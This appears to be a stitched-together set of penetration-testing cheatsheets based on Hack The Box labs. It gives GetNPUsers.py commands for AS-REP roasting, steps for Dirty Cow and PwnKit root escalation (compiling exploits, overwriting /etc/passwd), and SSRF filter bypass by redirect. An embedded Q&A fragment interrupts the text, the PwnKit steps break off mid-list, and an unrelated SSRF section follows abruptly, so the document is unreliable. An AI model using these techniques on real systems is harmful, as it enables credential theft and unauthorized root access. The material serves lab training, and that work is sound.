# AS-REP Roasting Cheatsheet

## Mechanism
AS-REP Roasting exploits the `UF_DONT_REQUIRE_PREAUTH` flag (also known as "Do not require Kerberos preauthentication") on Active Directory user accounts.
*   **Vulnerability:** Accounts with this flag allow anyone to request an AS-REP (Authentication Service-Reply) ticket from the KDC without prior authentication.
*   **Payload:** The AS-REP contains a TGT and session key encrypted with the user's password hash.
*   **Attack:** The attacker captures this encrypted hash and performs offline brute-force cracking. If the password is weak, the attacker can decrypt the key and obtain valid credentials. (seen on: htb-active)

## Tools & Commands

### 1. Impacket `GetNPUsers.py`
The primary tool for checking the `UF_DONT_REQUIRE_PREAUTH` flag and capturing the hash.

**Single User Check:**
```bash
GetNPUsers.py -no-pass -dc-ip <DC_IP> <DOMAIN>/<USERNAME>
```
*(seen on: htb-pivotapi)*

**Batch Check (Loop):**
```bash
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip <DC_IP> <DOMAIN>/$user | grep krb5asrep; done
```
*(seen on: htb-blackfield)*

**User File Check:**
```bash
GetNPUsers.py -dc-ip <DC_IP> -usersfile <USER_LIST_FILE> <DOMAIN>/
```
*(seen on: htb-absolute, htb-infiltrator)*

### 2. NetExec / CrackMapExec
Can also be used to identify users with the flag set.
*   **NetExec:** Can dump hashes via AS-REP-Roasting. (seen on: htb-infiltrator)
*   **CrackMapExec:** Identifies valid users by returning `STATUS_ACCOUNT_RESTRICTION` (purple `[-]`) instead of `STATUS_LOGON_FAILURE` for accounts with the flag set. (seen on: htb-absolute)

### 3. Kerbrute
A development version of Kerbrute can automatically perform AS-REP-Roasting when it finds a user with the `DONT_REQUIRE_PREAUTH` flag set. (seen on: htb-infiltrator)

## Q12 — Linux kernel privilege escalation (Dirty Cow / PwnKit)

**Question:** How are Linux kernel vulnerabilities like Dirty Cow (CVE-2016-5195) or PwnKit (CVE-2021-4034) exploited across HTB machines?

**Answer:**

# Linux Kernel Vulnerability Exploitation Cheatsheet

## Recon & Enumeration
*   **Kernel Version Check**: Identify the running kernel version to determine vulnerability surface.
    *   Command: `uname -a` or `uname -r`
    *   *Example*: `2.6.31-14-generic-pae` indicates high likelihood of DirtyCow vulnerability. (seen on: Popcorn)
*   **Binary Timestamp Analysis**: For PwnKit (CVE-2021-4034), check the modification date of `pkexec` to infer patch status, as version numbers often remain unchanged after patching.
    *   Command: `ls -l /usr/bin/pkexec`
    *   *Logic*: If the binary date is significantly older than the CVE release (e.g., July 2021 vs. early 2022), it is likely vulnerable. (seen on: Pressed)
*   **SUID Bit Verification**: Critical for PwnKit. The exploit only yields root if `pkexec` has the SetUID bit set.
    *   Command: `ls -l /usr/bin/pkexec`
    *   *Check*: Look for `-rwsr-xr-x` (SUID set) vs `-rwxr-xr-x` (SUID not set).
    *   *Note*: If SUID is not set, the exploit is a false positive and will only execute as the current user. (seen on: Paper, Routerspace)

## Privilege Escalation

### Dirty Cow (CVE-2016-5195)
*   **Technique**: Race condition in `/proc/self/mem` allowing write access to read-only memory.
*   **Exploitation Steps**:
    1.  Identify vulnerable kernel (e.g., < 3.9). (seen on: Valentine, Popcorn)
    2.  Retrieve a Proof of Concept (POC) such as `dirty.c` or `40616.c`.
    3.  Compile the exploit on the target machine.
        *   Command: `gcc -pthread dirty.c -o dirty -lcrypt` (seen on: Popcorn)
    4.  Execute the exploit.
        *   Command: `./dirty`
    5.  The exploit typically backs up `/etc/passwd`, allows the user to set a new password for a new root user, and modifies the file.
    6.  Switch to the new root user.
        *   Command: `su - <new_user>` (seen on: Popcorn)
*   **Searchsploit References**:
    *   `exploits/linux/local/40616.c` (SUID Method)
    *   `exploits/linux/local/40847.cpp` (/etc/passwd Method)
    *   `exploits/linux/local/40838.c` (PTRACE_POKEDATA Write Access)
    *   (seen on: Valentine)

### PwnKit (CVE-2021-4034)
*   **Technique**: Mishandling of an empty `argc` in `pkexec` (Polkit) to achieve code execution.
*   **Prerequisites**:
    *   `pkexec` must be installed.
    *   `pkexec` **must** have the SetUID bit set to root.
*   **Exploitation Steps**:
    1.  Verify `pkexec` location and permissions.
        *   Command: `which pkexec`
        *   Command: `ls -l /usr/bin/pkexec`

# Server-Side Request Forgery (SSRF) Exploitation Cheatsheet

## Recon & Identification
*   **Identify URL Parameters:** Look for parameters that accept URLs (e.g., `sourceURL`, `website`, `import` fields).

*   **Check for Deny Lists/Filters:** Some applications block direct access to `127.0.0.1` or `localhost`.
    *   *Bypass:* Use redirects. Have the server contact the attacker first, then return a `302` redirect to the internal target.
    *   *Example:* On **Forge**, a deny list blocked direct localhost access. The attacker used a redirect to bypass the filter and access the admin site. (seen on: htb-forge)
*   **Version Enumeration:** Identify specific software versions to match known CVEs.
    *   *Example:* On **Sau**, identifying **Request-Baskets v1.2.1** led to the discovery of **CVE-2023-27163**. (seen on: htb-sau)
